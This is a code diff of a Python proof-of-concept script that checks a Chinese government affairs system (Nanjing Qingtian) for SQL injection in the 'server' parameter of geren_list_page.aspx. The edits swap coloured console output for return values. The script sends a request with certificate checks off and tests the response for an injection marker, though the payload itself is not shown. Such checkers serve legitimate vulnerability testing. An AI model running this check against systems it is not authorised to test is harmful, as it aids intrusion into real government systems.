@@ -8,8 +8,8 @@ description: 文件/index_page/geren_list_page.aspx中,参数server存在SQL注�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class skytech_geren_list_page_sqli_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class skytech_geren_list_page_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"WtFaBcMicrosoft" in req.text:
-                cprint("[+]存在南京擎天政务系统 geren_list_page.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在南京擎天政务系统 geren_list_page.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = skytech_geren_list_page_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
